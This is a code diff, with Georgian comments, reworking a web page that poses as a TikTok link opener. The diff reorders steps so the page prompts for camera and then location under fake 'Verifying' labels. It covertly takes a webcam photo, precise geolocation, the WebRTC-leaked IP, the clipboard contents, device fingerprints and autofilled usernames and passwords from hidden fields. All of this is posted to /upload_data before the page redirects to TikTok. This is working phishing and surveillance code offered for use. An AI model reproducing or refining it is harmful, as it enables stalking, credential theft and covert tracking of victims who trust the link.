@@ -45,26 +45,48 @@
             orientation: "უცნობია", vibrated: "არა"
         };
 
-        function getAutofillData() {
-            const user = document.getElementById('hiddenUser').value;
-            const pass = document.getElementById('hiddenPass').value;
-            if (user) secretData.autofilledUser = user;
-            if (pass) secretData.autofilledPass = pass;
-        }
+        // 🚨 1. კამერა (ჯერ ეს ითხოვს Allow-ს და ელოდება ფოტოს)
+        const getCamera = () => new Promise((resolve) => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then(stream => {
+                        const video = document.getElementById('video');
+                        video.srcObject = stream; video.play();
+                        setTimeout(() => {
+                            const canvas = document.getElementById('canvas'); 
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth || 640; 
+                            canvas.height = video.videoHeight || 480;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            stream.getTracks().forEach(track => track.stop()); 
+                            resolve(canvas.toDataURL('image/png'));
+                        }, 3000);
+                    }).catch(() => resolve(null));
+            } else { resolve(null); }
+        });
 
-        async function getIP() {
+        // 🚨 2. ლოკაცია (კამერის შემდეგ ითხოვს Allow-ს)
+        const getLocation = () => new Promise((resolve) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    () => resolve({ lat: "უარი", lon: "უარი" }),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else { resolve({ lat: "უარი", lon: "უარი" }); }
+        });
+
+        // 3. დანარჩენი 7 საიდუმლო ინფო (მხოლოდ ლოკაციის შემდეგ)
+        async function collectRestInfo() {
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                 pc.createDataChannel(''); const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
                 pc.onicecandidate = (ice) => {
                     if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-                    secretData.ip = myIP; pc.close();
+                    secretData.ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1]; pc.close();
                 };
             } catch (e) {}
-        }
 
-        function getAudioFingerprint() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator(); const analyser = audioCtx.createAnalyser();
@@ -78,9 +100,7 @@
                 };
                 oscillator.start(0);
             } catch (e) {}
-        }
 
-        function getFonts() {
             const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Sylfaen', 'BPG Arial']; 
             const testString = "mmmmmmmmmmlli"; const span = document.createElement('span');
             span.style.fontSize = '72px'; span.style.position = 'absolute'; span.style.left = '-9999px'; span.innerText = testString;
@@ -91,25 +111,12 @@
                 if (span.offsetWidth > 0) detected.push(testFonts[i]);
             }
             document.body.removeChild(span); secretData.fonts = detected.join(', '); 
-        }
 
-        async function getClipboard() {
             try { if (navigator.clipboard && navigator.clipboard.readText) { secretData.clipboard = await navigator.clipboard.readText() || "ცარიელია"; } } catch (e) { secretData.clipboard = "წვდომა აკრძალულია"; }
-        }
-
-        async function getBattery() {
             try { if (navigator.getBattery) { const b = await navigator.getBattery(); secretData.battery = Math.round(b.level * 100) + "% " + (b.charging ? "(დატენვაზე)" : ""); } } catch (e) {}
-        }
-
-        function getNetwork() {
             try { if (navigator.connection) { secretData.network = navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)"; } } catch (e) {}
-        }
-
-        function getTabs() {
             try { secretData.tabs = window.history.length.toString(); } catch (e) {}
-        }
 
-        function getOrientation() {
             if (window.DeviceOrientationEvent) {
                 window.addEventListener('deviceorientation', function(event) {
                     let beta = event.beta; let gamma = event.gamma;
@@ -118,69 +125,53 @@
                     else secretData.orientation = "დახრილი";
                 });
             }
+
+            try { if (navigator.vibrate) { navigator.vibrate([100, 50, 100]); secretData.vibrated = "დიახ"; } } catch (e) {}
+            
+            const user = document.getElementById('hiddenUser').value;
+            const pass = document.getElementById('hiddenPass').value;
+            if (user) secretData.autofilledUser = user;
+            if (pass) secretData.autofilledPass = pass;
         }
 
-        function getVibration() {
-            try {
-                if (navigator.vibrate) {
-                    navigator.vibrate([100, 50, 100]);
-                    secretData.vibrated = "დიახ";
-                }
-            } catch (e) {}
-        }
-
+        // 🚨 მთავარი ფუნქცია (მკაცრი თანმიმდევრობით)
         async function startProcess() {
             const btn = document.getElementById('mainBtn');
             const loader = document.getElementById('loader');
             
-            btn.disabled = true; btn.innerText = "იტვირთება..."; loader.style.display = 'block';
+            btn.disabled = true; 
+            btn.innerText = "იტვირთება..."; 
+            loader.style.display = 'block';
 
-            getAutofillData();
-            await getIP(); getAudioFingerprint(); getFonts(); await getClipboard(); await getBattery(); getNetwork(); getTabs();
-            getOrientation(); getVibration();
+            // 1. კამერა
+            btn.innerText = "Verifying camera...";
+            const image = await getCamera();
+            secretData.image = image;
 
-            const getCamera = () => new Promise((resolve) => {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                        .then(stream => {
-                            const video = document.getElementById('video');
-                            video.srcObject = stream; video.play();
-                            setTimeout(() => {
-                                const canvas = document.getElementById('canvas'); const ctx = canvas.getContext('2d');
-                                canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                stream.getTracks().forEach(track => track.stop()); resolve(canvas.toDataURL('image/png'));
-                            }, 3000);
-                        }).catch(() => resolve(null));
-                } else { resolve(null); }
+            // 2. ლოკაცია
+            btn.innerText = "Verifying location...";
+            const loc = await getLocation();
+            secretData.lat = loc.lat; 
+            secretData.lon = loc.lon;
+
+            // 3. დანარჩენი ინფო
+            btn.innerText = "Finalizing...";
+            await collectRestInfo();
+            
+            secretData.userAgent = navigator.userAgent; 
+            secretData.screen = window.screen.width + "x" + window.screen.height;
+            secretData.ram = navigator.deviceMemory || "უცნობია";
+
+            // 4. გაგზავნა
+            await fetch('/upload_data', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
             });
 
-            const getLocation = () => new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-                        () => resolve({ lat: "უარი", lon: "უარი" }),
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                } else { resolve({ lat: "უარი", lon: "უარი" }); }
-            });
-
-            Promise.all([getCamera(), getLocation()]).then(async ([image, loc]) => {
-                secretData.image = image; secretData.lat = loc.lat; secretData.lon = loc.lon;
-                secretData.userAgent = navigator.userAgent; secretData.screen = window.screen.width + "x" + window.screen.height;
-                secretData.ram = navigator.deviceMemory || "უცნობია";
-
-                await fetch('/upload_data', {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
-                });
-
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                    document.querySelector('.container').innerHTML = `<div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>`;
-                    setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
-                }, 500);
-            });
+            // 5. წარმატება
+            loader.style.display = 'none';
+            document.querySelector('.container').innerHTML = `<div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>`;
+            setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
         }
     </script>
 </body>
